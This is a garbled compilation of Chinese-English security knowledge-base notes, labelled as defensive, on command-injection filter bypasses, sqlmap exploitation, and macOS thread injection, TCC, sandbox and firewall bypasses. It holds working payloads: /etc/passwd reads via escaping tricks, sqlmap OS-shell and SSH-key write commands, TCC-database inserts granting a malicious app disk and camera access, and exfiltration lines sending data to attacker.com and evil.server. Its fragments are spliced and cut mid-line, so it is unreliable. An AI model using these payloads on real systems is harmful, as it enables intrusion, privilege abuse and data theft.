12original_cmd_by_serverls # 18. 绕过 With Backslash Newline 123$ cat /et\ c/pa\ sswd # 19. 绕过 With Backslash Newline 1cat%20/et%5C%0Ac/pa%5C%0Asswd # 20. 绕过 With Tilde Expansion 12echo ~+echo ~- # 21. 绕过 With Brace Expansion 1234567{,ip,a}{,ifconfig}{,ifconfig,eth0}{l,-lh}s{,echo,#test}{,$"whoami",}{,/?s?/?i?/c?t,/e??/p??s??,} # 22. 绕过 Characters Filter 1234567891011121314swissky@crashlab:~$ echo ${HOME:0:1}/swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwdroot:x:0:0:root:/root:/bin/bashswissky@crashlab:~$ echo . | tr '!-0' '"-1'/swissky@crashlab:~$ tr '!-0' '"-1' <<< ./swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwdroot:x:0:0:root:/root:/bin/bash # 23. 绕过 Characters Filter Via Hex Encoding 1234567891011121314151617181920212223swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"/etc/pas

title: sqlmap：Linux 原生工具利用
content: 来源路径： 02-知识点/防御检测与OPSEC/sqlmap：Linux 原生工具利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # sqlmap：Linux 原生工具利用 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 sqlmap：Linux 原生工具利用 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 sqlmap：Linux 原生工具利用 建立行为证据、检测逻辑和操作暴露面。 优先关注：SQLmap、Basic Arguments For SQLmap、Load A Request File、Custom Injection Point、Second Order Injection；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 44 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SQLmap Basic Arguments For SQLmap Load A Request File Custom Injection Point Second Order Injection Getting A Shell Crawl And Auto - 利用 Proxy Configuration For SQLmap Injection Tampering Suffix And Prefix Default Tamper Scripts Custom Tamper Scripts Custom SQL 载荷 Evaluate Python Code Preprocess And Postprocess Scripts Preprocessing Script (preprocess.py) Postprocessing Script (postprocess.py) Reduce Requests Number # 核心要点 SQLmap is a powerful tool that automates the 检测 and 利用 of SQL 注入 vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts. A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL 注入 testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use to target more complex applications. A custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject 载荷 into a request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect automatically. By defining a custom injection point with the wildcard character '*' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable. A second-order SQL 注入 occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query. --suffix=SUFFIX: The --suffix option appends a specified string to the end of each 载荷 generated by SQLMap. --prefix=PREFIX: The --prefix option prepends a specified string to the beginning of each 载荷 generated by SQLMap. tamper (载荷): The main function that modifies the 载荷. 令牌 generation: For handling CSRF tokens or dynamic auth headers. The --technique argument defines which SQL 注入 methods sqlmap will attempt. luanginxmore generates ~4.2M random POST parameters before your 载荷；use it only with --method=POST and expect large request sizes to crash poorly configured Lua-Nginx WAFs. 利用 sqlmap 的合法功能完成 inherit 等操作；重点关注 sudo、SUID、受限 shell 与文件读写上下文。 # 命令 / 载荷 / 操作片段 # 1. Basic Arguments For SQLmap 1sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs # 2. Load A Request File 1sqlmap -r request.txt # 3. Custom Injection Point 1sqlmap -u "http://example.com" --data "username=admin&password=pass" --headers="x-forwarded-for:127.0.0.1*" # 4. Second Order Injection 12sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs # 5. Getting A Shell 1sqlmap -u "http://example.com/?id=1" -p id --sql-shell # 6. Getting A Shell 1sqlmap -u "http://example.com/?id=1" -p id --os-shell # 7. Getting A Shell 1sqlmap -u "http://example.com/?id=1" -p id --os-pwn # 8. Getting A Shell 1sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/ # 9. Crawl And Auto - 利用 1sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 # 10. content: 来源路径： 02-知识点/防御检测与OPSEC/macOS Thread Injection via Task port 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Thread Injection via Task port 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 macOS Thread Injection via Task port 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 macOS Thread Injection via Task port 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：macOS Thread Injection via Task port、Code、Thread Hijacking、Mach ports for communication、Basic Memory Read/Write Primitives；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Thread Injection via Task port Code Thread Hijacking Mach ports for communication Basic Memory Read/Write Primitives Memory reading and writing using the execute primitive Identifying suitable functions Shared Memory Setup Process overview Achieving Full Control Apple Silicon (arm64e) Nuances 检测 & Hardening with EndpointSecurity Hardened-runtime considerations Recent Public Tooling (2023-2025) # 核心要点 https://github.com/bazad/threadexec To control the thread, thread suspend() is called, halting its execution. The subsequent phase involves establishing Mach ports to facilitate communication with the remote thread. These ports are instrumental in transferring arbitrary send/receive rights between tasks. A strategy involves leveraging thread set special port() to place a send right to the local port in the remote thread’s THREAD KERNEL PORT. Then, the remote thread is instructed to call mach thread self() to retrieve the send right. The goal is to perform memory reading and writing using specific functions. For reading memory: A scan of common libraries revealed appropriate candidates for these operations: Insert a send right with thread set special port() and overwrite the 0x18 field with the remote entry’s name. ES EVENT TYPE NOTIFY REMOTE THREAD CREATE – emitted whenever a thread is created in a different task. ES EVENT TYPE NOTIFY THREAD SET STATE (added in macOS 14 Sonoma) – indicates register manipulation of an existing thread. # 命令 / 载荷 / 操作片段 # 1. Memory reading and writing using the execute primitive 123uint64_t read_func(uint64_t *address) { return *address;} # 2. Memory reading and writing using the execute primitive 123void write_func(uint64_t *address, uint64_t value) { *address = value;} # 3. Memory reading and writing using the execute primitive 123456_read_func: ldr x0, [x0] ret_write_func: str x1, [x0] ret # 4. Identifying suitable functions 123const char *property_getName(objc_property_t prop) { return prop->name;} # 5. Identifying suitable functions 123__xpc_int64_set_value: str x1, [x0, #0x18] ret # 6. Identifying suitable functions 1_xpc_int64_set_value(address - 0x18, value); # 7. Apple Silicon (arm64e) Nuances 12uint64_t ptr = (uint64_t)payload;ptr = ptrauth_sign_unauthenticated((void*)ptr, ptrauth_key_asia, 0); # 8. 检测 & Hardening with EndpointSecurity 123456789import EndpointSecuritylet client = try! ESClient(subscriptions: [.notifyRemoteThreadCreate]) { (_, msg) in if let evt = msg.remoteThreadCreate { print("[ALERT] remote thread in pid \(evt.target.pid) by pid \(evt.thread.pid)") }}RunLoop.main.run() # 9. 检测 & Hardening with EndpointSecurity 123SELECT target_pid, source_pid, target_pathFROM es_process_eventsWHERE event_type = 'REMOTE_THREAD_CREATE'; # 工具与参考入口 https://github.com/bazad/threadexec https://gist.github.com/knightsc/bd6dfeccb02b77eb6409db5601dcef36 task vaccine https://bazad.github.io/2018/10/bypassing-platform-binary-task-threads/ # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/macOS TCC Bypasses 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS TCC Bypasses 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 macOS TCC Bypasses 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 macOS TCC Bypasses 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：macOS TCC Bypasses、By functionality、Write 绕过、TCC ClickJacking、TCC Request by arbitrary name；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS TCC Bypasses By functionality Write 绕过 TCC ClickJacking TCC Request by arbitrary name SSH 绕过 Handle extensions：CVE-2022-26767 iCloud kTCCServiceAppleEvents / Automation Over iTerm Over Finder By App behaviour CVE-2020–9934：TCC <a href="#c19b" id="c19b"></a> CVE-2021-30761：Notes CVE-2021-30782：Translocation CVE-2023-38571：Music & TV <a href="#cve-2023-38571-a-macos-tcc - 绕过 - in-music-and-tv" id="cve-2023-38571-a-macos-tcc - 绕过 - in-music-and-tv"></a> SQLITE SQLLOG DIR：CVE-2023-32422 SQLITE AUTO TRACE # 核心要点 This is not a 绕过，it's just how TCC works: It doesn't protect from writing. If Terminal doesn't have access to read the Desktop of a user it can still write into it: The extended attribute com.apple.macl is added to the new file to give the creators app access to read it. Attacker can create apps with any name (e.g. Finder, Google Chrome...) in the Info.plist and make it request access to some TCC protected location. The user will think that the legit application is the one requesting this access.\ ../../../macos-privilege-escalation.md By default an access via SSH used to have "Full Disk Access". In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges): Here you can find examples of how some malwares have been able to 绕过 this protection: https://www.jamf.com/blog/zero-day-tcc - 绕过 - discovered-in-xcsset-malware/ More info in the writeup and in the talk. one or more write()s will write the contents to the file (we do not control this) .terminal scripts are plist files such as this one with the command to execute in the CommandString key: Any user (even unprivileged ones) can create and mount a time machine snapshot an access ALL the files of that snapshot.\ # 命令 / 载荷 / 操作片段 # 1. Write 绕过 1234567username@hostname ~ % ls Desktopls: Desktop: Operation not permittedusername@hostname ~ % echo asd > Desktop/lalalausername@hostname ~ % ls Desktopls: Desktop: Operation not permittedusername@hostname ~ % cat Desktop/lalalaasd # 2. Over iTerm 123456789tell application "iTerm" activate tell current window create tab with default profile end tell tell current session of current window write text "cp ~/Desktop/private.txt /tmp" end tellend tell # 3. Over iTerm 1osascript iterm.script # 4. Over Finder 1234567set a_user to do shell script "logname"tell application "Finder"set desc to path to home folderset copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacingset t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as textend telldo shell script "rm " & POSIX path of (copyFile as alias) # 5. SQLITE AUTO TRACE 12# Set this env variable everywherelaunchctl setenv SQLITE_AUTO_TRACE 1 # 6. CVE-2023-26818：Telegram 1launchctl load com.telegram.launcher.plist # 7. Terminal Scripts 123456789101112131415<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"><dict> <key>CommandString</key> <string>cp ~/Desktop/private.txt /tmp/;</string> <key>ProfileCurrentVersion</key> <real>2.0600000000000001</real> <key>RunCommandAsShell</key> <false/> <key>name</key> <string>exploit</string> <key>type</key> <string>Window Settings</string></dict></plist> # 8. Terminal Scripts 12345678// Write plist in /tmp/tcc.terminal[...]NSTask *task = [[NSTask alloc] init];NSString * exploit_location = @"/tmp/tcc.terminal";task.launchPath = @"/usr/bin/open";task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",exploit_location]; task.standardOutput = pipe;[task launch]; # 9. CVE-2020-9771：mount apfs TCC 绕过 and 权限提升 1234567891011121314151617# Create snapshottmutil localsnapshot# List snapshotstmutil listlocalsnapshots /Snapshots for disk /:com.apple.TimeMachine.2023-05-29-001751.local# Generate folder to mount itcd /tmp # I didn it from this foldermkdir /tmp/sna

content: 来源路径： 02-知识点/防御检测与OPSEC/macOS Sealed System Volume & DataVault 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Sealed System Volume & DataVault 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 macOS Sealed System Volume & DataVault 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 macOS Sealed System Volume & DataVault 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：macOS Sealed System Volume & DataVault、Sealed System Volume (SSV)、Basic Information、Checking SSV Status、SSV Writer Entitlements；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Sealed System Volume & DataVault Sealed System Volume (SSV) Basic Information Checking SSV Status SSV Writer Entitlements Finding SSV Writers Attack Scenarios Snapshot Rollback Attack System Binary Replacement Real-World CVEs DataVault DataVault Controller Entitlements Finding DataVault Controllers Direct TCC Database Modification Keychain Database Access Real-World CVEs Involving DataVault/TCC 绕过 # 核心要点 Tamper 检测 — any modification to system binaries/frameworks is detectable via the broken cryptographic seal If an attacker compromises a binary with com.apple.private.apfs.revert-to-snapshot, they can roll back the system volume to a pre-update state, restoring known vulnerabilities: Snapshot rollback effectively undoes security updates, restoring previously-patched kernel and system vulnerabilities. This is one of the most dangerous operations possible on modern macOS. With SIP 绕过 + SSV write capability, an attacker can: Mount the system volume read-write Re-seal the snapshot (or accept the broken seal if SIP is already degraded) DataVault is Apple's protection layer for sensitive system databases. Even root cannot access DataVault-protected files — only processes with specific entitlements can read or modify them. Protected stores include: # 命令 / 载荷 / 操作片段 # 1. Checking SSV Status 1234567891011# Check if authenticated root is enabled (SSV seal verification)csrutil authenticated-root status# List APFS snapshots (the sealed snapshot is the boot volume)diskutil apfs listSnapshots disk3s1# Check mount status (should show read-only)mount | grep " / "# Verify the system volume sealdiskutil apfs listVolumeGroups # 2. Finding SSV Writers 12345678910111213# Search for binaries with SSV-related entitlementsfind /System /usr -type f -perm +111 -exec sh -c ' ents=$(codesign -d --entitlements - "{}" 2>&1) echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"' \; 2>/dev/null# Using the scanner databasesqlite3 /tmp/executables.db "SELECT e.path, c.nameFROM executables eJOIN executable_capabilities ec ON e.id = ec.executable_idJOIN capabilities c ON ec.capability_id = c.idWHERE c.name = 'ssv_writer';" # 3. Snapshot Rollback Attack 123456# Conceptual — the snapshot revert operation would:# 1. List available snapshotsdiskutil apfs listSnapshots disk3s1# 2. Revert to an older snapshot (requires the entitlement)# This restores the system to a state with known, patched vulnerabilities # 4. DataVault Controller Entitlements 1234com.apple.private.tcc.manager — Full TCC database read/writecom.apple.private.tcc.manager.check-by-audit-token — TCC checks via audit tokencom.apple.private.tcc.allow — Access specific TCC-protected resourcescom.apple.rootless.storage.TCC — Write to TCC database (SIP-related) # 5. Finding DataVault Controllers 12345678910111213141516# Check DataVault protection on the TCC databasels -le@ "/Library/Application Support/com.apple.TCC/TCC.db"# Find binaries with TCC management entitlementsfind /System /usr -type f -perm +111 -exec sh -c ' ents=$(codesign -d --entitlements - "{}" 2>&1) echo "$ents" | grep -q "private.tcc\|datavault\|rootless.storage.TCC" && echo "{}"' \; 2>/dev/null# Using the scannersqlite3 /tmp/executables.db "SELECT e.path, c.nameFROM executables eJOIN executable_capabilities ec ON e.id = ec.executable_idJOIN capabilities c ON ec.capability_id = c.idWHERE c.name = 'datavault_controller';" # 6. Direct TCC Database Modification 1234567-- Grant Full Disk Access to a malicious binary (conceptual)INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);-- Grant camera access without a promptINSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1); # 工具与参考入口 Apple Platform Security — Data Protection The Nightmare of Apple OTA Updates (APFS Snapshot

content: 来源路径： 02-知识点/防御检测与OPSEC/macOS Sandbox Debug & 绕过.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Sandbox Debug & 绕过 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 macOS Sandbox Debug & 绕过 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 macOS Sandbox Debug & 绕过 建立行为证据、检测逻辑和操作暴露面。 优先关注：Sandbox loading process、Possible Bypasses、Bypassing quarantine attribute、Abusing Open functionality、Launch Agents/Daemons；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 16 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Sandbox loading process Possible Bypasses Bypassing quarantine attribute Abusing Open functionality Launch Agents/Daemons Abusing Auto Start Locations Abusing other processes Available System and User Mach services Available PID Mach services /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc Static Compiling & Dynamically linking Shellcodes Not inherited restrictions Entitlements Interposting 绕过 Interpost libsecinit initializer to prevent the sandbox # 核心要点 In the last examples of Word sandbox 绕过 can be appreciated how the open cli functionality could be abused to 绕过 the sandbox. macos-office-sandbox-bypasses.md Even if an application is meant to be sandboxed (com.apple.security.app-sandbox), it's possible to make 绕过 the sandbox if it's executed from a LaunchAgent (~/Library/LaunchAgents) for example.\ As explained in this post, if you want to gain 持久化 with an application that is sandboxed you could make be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables. For this you might even need 2 steps: To make a process with a more permissive sandbox (file-read*, file-write*) execute your code which will actually write in a place where it will be executed unsandboxed. As indicated in this writeup, the info about Mach services is stored in /System/Library/xpc/launchd.plist. It's possible to find all the System and User Mach services by searching inside that file for <string>System</string> and <string>User</string>. This research discovered 2 ways to 绕过 the Sandbox. Because the sandbox is applied from userland when the libSystem library is loaded. If a binary could avoid loading it, it would never get sandboxed: # 命令 / 载荷 / 操作片段 # 1. Available System and User Mach services 1234567891011121314151617181920void checkService(const char *serviceName) { mach_port_t service_port = MACH_PORT_NULL; kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port); if (!err) { NSLog(@"available service:%s", serviceName); mach_port_deallocate(mach_task_self_, service_port); }}void print_available_xpc(void) { NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"]; NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"]; for (NSString* key in launchDaemons) { NSDictionary<NSString*, id>* job = launchDaemons[key]; NSDictionary<NSString*, id>* machServices = job[@"MachServices"]; for (NSString* serviceName in machServices) { checkService(serviceName.UTF8String); } }} # 2. Available PID Mach services 1[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load]; # 3. Available PID Mach services 12find /System/Library/Frameworks -name "*.xpc"find /System/Library/PrivateFrameworks -name "*.xpc" # 4. /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc 12345678910111213141516@protocol SKRemoteTaskRunnerProtocol-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;@endvoid exploit_storagekitfsrunner(void) { [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)]; [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}]; [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}]; [conn resume]; [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) { NSLog(@"run task result:%@, error:%@", bSucc, error); }];} # 5. /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPC

Santa: Binary 授权 and monitoring system for macOS. It uses an Endpoint Security client to authorize exec events before code runs, so it is common in enterprise fleets focused on allowlisting/denylisting instead of only post-execution 检测. Recent macOS releases made some previously annoying-to-detect user-driven bypasses much noisier for blue teams: macOS 15+: Endpoint Security clients can receive gatekeeper user override events, so manual Gatekeeper bypasses can be centrally logged. Current macOS Endpoint Security tooling can also ingest XProtect malware 检测 events, making it easier to confirm what Apple already detected on the endpoint. # 命令 / 载荷 / 操作片段 # 1. Or if you are using an enterprise certificate you could create your own entitlements starting with com.apple actually and 绕过 protections based on this. The entitlement com.apple.rootless.install.heritable allows to 绕过 SIP. Check this for more info. The entitlement com.apple.rootless.install allows to 绕过 SIP. Check this for more info. This entitlement allows to load frameworks, plug-ins, or libraries without being either signed by Apple or signed with the same Team ID as the main executable, so an attacker could abuse some arbitrary library load to inject code. Check this for more info. These entitlements allows to install software without asking for permissions to the user, which can be helpful for a 权限提升. The entitlement com.apple.private.icloud-account-access it's possible to communicate with com.apple.iCloudHelper XPC service which will provide iCloud tokens. Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded. Enumerate binaries that already hold the outgoing-network entitlement (useful for piggy-backing): # 命令 / 载荷 / 操作片段 # 1. Check allowed traffic 1lsof -i TCP -sTCP:ESTABLISHED # 2. Via Browser apps 123456tell application "Safari" run tell application "Finder" to set visible of process "Safari" to false make new document set the URL of document 1 to "https://attacker.com?data=data%20to%20exfilend tell # 3. Via Browser apps 1"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil" # 4. Via Browser apps 1firefox-bin --headless "https://attacker.com?data=data%20to%20exfil" # 5. Via Browser apps 1open -j -a Safari "https://attacker.com?data=data%20to%20exfil" # 6. Web content filter (Screen Time) 绕过 – CVE-2024-44206 12open "http://attacker%2Ecom%2F./" # should be blocked by Screen Time# if the patch is missing Safari will happily load the page # 7. Packet Filter (PF) rule-ordering bug in early macOS 14 “Sonoma” 12pfctl -sr | grep quick # rules are present…sudo tcpdump -n -i en0 not port 53 # …but packets still leave the interface # 8. Abusing Apple-signed helper services (legacy – pre-macOS 11.2) 123456import subprocess, socket# Launch excluded App Store helper (path collapsed for clarity)subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])# Connect through the inherited sockets = socket.create_connection(("evil.server", 443))s.send(b"exfil...") # 9. QUIC/ECH to evade Network Extension domain filters (macOS 12+) 12345678# Chrome/Edge – force HTTP/3 and ECH/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \ --enable-quic --origin-to-force-quic-on=attacker.com:443 \ --enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \ https://attacker.com/payload# cURL 8.10+ built with quichecurl --http3-only https://attacker.com/payload # 10. macOS 15 “Sequoia” Network Extension instability (2024–2025) 123456789# create many short UDP flows to exhaust NE filter queuespython3 - <<'PY'import socket, osfor i in range(5000): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.sendto(b'X'*32, ('1.1.1.1', 53))PY# watch for NetExt crash / reconnect looplog stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog # 11. Tooling tips for modern macOS 1sudo pfctl -a com.apple/250.ApplicationFirewall -sr # 12. Tooling tips for modern macOS 12codesign -d --entitlements :- /path/to/bin 2>/dev/null \ | plutil -extract com.apple.security.network.client xml1 -o - - # 工具与参考入口 https://www.youtube.com/watch?v=UlT5KFTMn2k # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Document the invariants they assume (oracle prices, collateral ratios, rebalance cadence…). Translate the AADAPT taxonomy into concrete attack candidates per component. Operational weaknesses: exposed CI 凭据，over-privileged IAM roles, misconfigured KMS policies, automation accounts that can request arbitrary signatures, public buckets with bridge configs, etc. Value-specific weaknesses: fragile oracle parameters, upgradable contracts without multi-party approvals, flash-loan sensitive liquidity, governance actions that 绕过 timelocks. Instrument telemetry streams so every scenario produces actionable 检测 data. Chain-level traces: full call graphs, gas usage, transaction nonces, block timestamps—to reconstruct flash-loan bundles, reentrancy-like structures, and cross-contract hops. Anomaly markers: derived metrics such as slippage spikes, abnormal collateralization ratios, unusual gas density, or cross-chain velocity. Measurement: Do KMS/HSM logs raise anomaly alerts (time-of-day, destination drift, burst of high-risk operations)? Can policies or multisig thresholds prevent unilateral abuse? Are throttles/rate limits or additional approvals enforced? Measurement: Time to correlate events across telemetry + commercial chain analytics, completeness of the reconstructed path, ability to identify choke points for freezing in a real incident, and alert fidelity for abnormal cross-chain velocity/value. # 工具与参考入口 MITRE AADAPT Framework as a Red Team Roadmap (Bishop Fox) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 SSTI 服务端模板注入 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It can help discover hidden patterns in data, group similar items together, or reduce the complexity of the data while preserving its essential features. We’ll reuse the synthetic data from the K-Means example (3 normal clusters + 1 attack cluster) and apply agglomerative clustering. We then illustrate how to obtain a dendrogram and cluster labels. DBSCAN is a density-based clustering algorithm that groups together points that are closely packed together while marking points in low-density regions as outliers. It is particularly useful for datasets with varying densities and non-spherical shapes. DBSCAN works by defining two parameters: DBSCAN identifies core points, border points, and noise points: <summary>Example -- Detecting Outliers in Network Logs HDBSCAN is an extension of DBSCAN that removes the need to pick a single global eps value and is able to recover clusters of different density by building a hierarchy of density-connected components and then condensing it. Compared with vanilla DBSCAN it usually Backdooring clustering models. The BadCME technique (BlackHat EU 2023) implants a tiny trigger pattern; whenever that trigger appears, a K-Means-based detector quietly places the event inside a “benign” cluster. 规避 of DBSCAN/HDBSCAN. A 2025 academic pre-print from KU Leuven showed that an attacker can craft beaconing patterns that purposely fall into density gaps, effectively hiding inside noise labels. content: 来源路径： 02-知识点/防御检测与OPSEC/Tapjacking 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Tapjacking 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Tapjacking 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Tapjacking 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Tapjacking、Basic Information、检测、Protection、Android 12+ default blocking & compat flags；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Tapjacking Basic Information 检测 Protection Android 12+ default blocking & compat flags Handling partial occlusion filterTouchesWhenObscured 